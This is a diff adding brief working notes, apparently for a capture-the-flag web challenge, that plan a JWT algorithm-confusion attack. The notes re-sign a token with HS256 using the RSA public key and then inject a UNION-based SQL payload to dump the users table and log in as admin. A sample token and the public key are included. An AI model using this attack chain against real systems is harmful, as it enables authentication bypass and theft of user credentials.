@@ -1,0 +1,26 @@
+Goal is to call getUser()
+In order to do this, we need to modify the cookie / token so that we can make it turn into an invalid user
+SELECT * FROM users WHERE username = '
+a' UNION SELECT * FROM users;--      <-- this is what we need i think
+'
+
+Attack chain:
+1) Sign using HS256 with the public key
+2) Decoding happens with the public key
+3) Middleware function is invoked and the username is passed 
+4) GetUser is called
+5) The entire table is dumped
+6) Login with admin credentials
+
+
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE3MDM2MzczMDV9.QSvfJCLKWaeJH_zu4x1R7t4nWuaxtZr7rOxaduVW-2v3Bd_DgG76YtwtqyuK6fRQdw29ObRkD4P7uJcmGkmv0ak9ssR7nc_lrhqo0ujjyj7KoJw9tpH7ReZjwtfcUprKyRzVDaegdjz3hcksz8ExojPNFdxwWC6VHwrGST7oB0FcjO6YWoIQpwEy5O8a912CFDS_zxRWStiNa-omWXFxfIg2w44fDNKGE9iPoDtNKB6TvugXg01OYrc0PIJzljfznSN5HXF9QkASeShf2Jv8fnaBddlo7xN_coE0I1m3VfAhLBlvU1fzFq7MlTH0KEqsIfdD0c81OX2sFB2T1hTQvg
+
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
+ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
+XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
+jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
++FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
+V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
+0wIDAQAB
+-----END PUBLIC KEY-----
